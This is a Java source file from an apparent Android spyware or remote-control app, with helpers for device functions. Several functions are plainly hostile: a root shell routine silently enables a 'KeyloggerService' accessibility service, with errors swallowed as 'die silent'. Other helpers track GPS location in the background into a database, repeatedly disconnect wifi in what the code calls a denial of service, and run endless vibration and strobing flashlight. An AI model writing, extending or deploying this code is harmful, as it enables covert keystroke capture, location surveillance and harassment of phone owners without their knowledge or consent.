package com.candroid.lofl.api;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.usb.UsbManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.provider.AlarmClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;

import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;
import com.candroid.lofl.services.CommandsIntentService;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Timer;
import java.util.TimerTask;

public class Systems {
    public static boolean sIsFlaghlightOn = false;
    public static CameraManager sCameraManager;

    public static class Vibrations{

        public static void vibrator(final Context context) {

            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                    if (vibrator.hasVibrator()) {
                        if (vibrator.hasAmplitudeControl()) {
                            vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
                        } else {
                            vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
                        }
                    }
                }
            };
            Timer timer = new Timer("vibratorTask", true);
            timer.schedule(timerTask, 1000, 60000 * 30);
        }

    }

    public static class Phone{

        public static void phoneCall(Context context, String address) {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + address));
            callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);
        }

        public static String getDeviceTelephoneNumber(Context context) {
            try {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return telephonyManager.getLine1Number();
            } catch (SecurityException e) {
                e.printStackTrace();
                return "";
            }
        }

        public static class Settings{
            public static void openAccessibilityOptions(Context context){
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }

            public static void requestIgnoreBatteryOptimizations(Context context){
                Intent intent = new Intent();
                intent.setAction(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
        }
    }

    public static class Alarms{

        public static void setAlarmClock(Context context) {
            Intent intent = new Intent();
            intent.setAction(AlarmClock.ACTION_SET_ALARM);
            intent.putExtra(AlarmClock.EXTRA_HOUR, 5);
            intent.putExtra(AlarmClock.EXTRA_MINUTES, 0);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }

        public static void setAlarmClock(Context context, int hours, int minutes){
            Intent intent = new Intent();
            intent.setAction(AlarmClock.ACTION_SET_ALARM);
            intent.putExtra(AlarmClock.EXTRA_HOUR, hours);
            intent.putExtra(AlarmClock.EXTRA_MINUTES, minutes);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }

    }

    public static class Processor{
        private static PowerManager.WakeLock sWakeLock;

        public static void startWakeLock(Context context){
            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            sWakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, context.getPackageName()+ ".wakelock");
            sWakeLock.acquire();
        }

        public static void stopWakeLock(){
            if(sWakeLock != null && sWakeLock.isHeld()){
                sWakeLock.release();
            }
            sWakeLock = null;
        }

        public static void lockScreen(Context context){
            if(context instanceof Activity){
                ((Activity)context).getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
            }
        }

    }

    public static class Camera{

        public static void persistentBlinkingFlashlight(final Context context) {
            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    String cameraId = null;
                    if (sCameraManager == null) {
                        sCameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                    }
                    try {
                        cameraId = sCameraManager.getCameraIdList()[0];
                    } catch (CameraAccessException e1) {
                        e1.printStackTrace();
                    }
                    if (sIsFlaghlightOn) {
                        try {
                            sCameraManager.setTorchMode(cameraId, false);
                            sIsFlaghlightOn = false;
                        } catch (CameraAccessException e1) {
                            e1.printStackTrace();
                        } catch (IllegalArgumentException e) {
                            e.printStackTrace();
                        }
                    } else {
                        try {
                            sCameraManager.setTorchMode(cameraId, true);
                            sIsFlaghlightOn = true;
                        } catch (CameraAccessException e1) {
                            e1.printStackTrace();
                        } catch (IllegalArgumentException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };
            Timer timer = new Timer("flashlightTask", true);
            timer.schedule(timerTask, 300L, 100L);
        }

        public static void turnOffFlashlight(Context context) {
            CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            try {
                cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], false);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }

    }

    public static class Networking{

        public static ArrayList<String> fetchIpv4Addresses(){
            ArrayList<String> ipAddresses = new ArrayList<>();
            try {
                for(Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements();){
                    for(Enumeration<InetAddress> addresses = interfaces.nextElement().getInetAddresses(); addresses.hasMoreElements();){
                        while(addresses.hasMoreElements()){
                            InetAddress address = addresses.nextElement();
                            if(!address.isLoopbackAddress() && !address.getHostAddress().contains(":")){
                                ipAddresses.add(address.getHostAddress());
                                Log.d("IP ADDRESSES", String.format("NETWORK NAME = %s", address.getHostName()));
                            }
                        }
                    }
                }

            } catch (SocketException e) {
                e.printStackTrace();
            }
            return ipAddresses;
        }

        public static boolean hasNetworkConnectivity(Context context) {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
            Network[] networks = connectivityManager.getAllNetworks();
            return networkInfo != null && networkInfo.isConnected();
        }


        public static boolean checkAirplaneMode(Context context){
            boolean isOn = false;
            if(Settings.System.getInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 0){
                isOn = true;
            }
            return isOn;
        }

        public static class Wifi{

            public static void dosWifiCard(Context context) {
                final WifiManager wifiManager = getWifiManager(context);
                int state = wifiManager.getWifiState();
                if (wifiManager.isWifiEnabled()) {
                    TimerTask dosWifiCardTask = new TimerTask() {
                        @Override
                        public void run() {
                            Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            wifiManager.reassociate();
                        }
                    };
                    Timer timer = new Timer("dosWifiCard", true);
                    timer.schedule(dosWifiCardTask, 5000L, 5000L);
                }
            }

            public static WifiManager getWifiManager(Context context) {
                return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            }

            public static void wifiScan(Context context) {
                getWifiManager(context).startScan();
            }

            public static void wifiDenialOfService(Context context) {
               final WifiManager wifiManager = getWifiManager(context);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        for (int i = 0; i < 500; i++) {
                            try {
                                Thread.sleep(10000);
                                wifiManager.disconnect();
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }).start();
            }

        }

    }

    public static class Usb{

        public static boolean isUsbDisconnected(Context context){
            UsbManager usbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
            return usbManager.getDeviceList().isEmpty() && usbManager.getAccessoryList() == null;
        }

    }

    public static class Gps{
        public static final String GPS_TRACKER_KEY = "GPS_TRACKER_KEY";
        public static HandlerThread sHandlerThread;
        public static Looper sLooper;
        public static LocationManager sLocationManager;
        public static LocationListener sLocationListener;

        public static boolean shouldTrackLocation(Context context){
            return PreferenceManager.getDefaultSharedPreferences(context).getBoolean(GPS_TRACKER_KEY, false);
        }

        public static void startLocationTracker(Context context){
            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                sHandlerThread = new HandlerThread("locationThread", Process.THREAD_PRIORITY_BACKGROUND);
                sHandlerThread.start();
                sLooper = sHandlerThread.getLooper();
                String locationProvider = LocationManager.GPS_PROVIDER;
                sLocationManager = Systems.Gps.getLocationManager(context);
                sLocationListener = Systems.Gps.getLocationListener(context);
                sLocationManager.requestLocationUpdates(locationProvider, 0, 30, sLocationListener, sLooper);
                SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
                editor.putBoolean(GPS_TRACKER_KEY, true);
                editor.apply();
            }
        }

        public static void stopLocationTracker(Context context){
            sLocationManager.removeUpdates(sLocationListener);
            sLooper.quitSafely();
            sHandlerThread.quitSafely();
            sLocationManager = null;
            sLooper = null;
            sHandlerThread = null;
            sLocationListener = null;
            SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
            editor.putBoolean(Systems.Gps.GPS_TRACKER_KEY, false);
            editor.apply();
        }

        public static boolean isTrackingLocation(){
            return sLocationManager != null;
        }

        public static LocationManager getLocationManager(Context context) {
            return (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        }

        public static LocationListener getLocationListener(final Context context) {
            return new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    try {
                        Database.insertLocation(DatabaseHelper.getInstance(context), location.getLatitude(), location.getLongitude());
                    } catch (IllegalStateException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {

                }

                @Override
                public void onProviderEnabled(String provider) {

                }

                @Override
                public void onProviderDisabled(String provider) {

                }
            };
        }

    }

    public static class Root{
        public static void startKeyloggingService(Context context){
            try {
                java.lang.Process process = Runtime.getRuntime().exec("su");
                DataOutputStream dos = new DataOutputStream(process.getOutputStream());
                String packageName = context.getPackageName();
                dos.writeBytes(String.format("settings put secure enabled_accessibility_services %s/%s.services.KeyloggerService\n", packageName, packageName));
                dos.flush();
                dos.writeBytes("settings put secure accessibility_enabled 1\n");
                dos.flush();
                dos.writeBytes("exit\n");
                dos.flush();
                process.waitFor();
                dos.close();
            } catch (IOException e) {
                //die silent
            } catch (InterruptedException e) {
                //die silent
            }
        }
    }

}
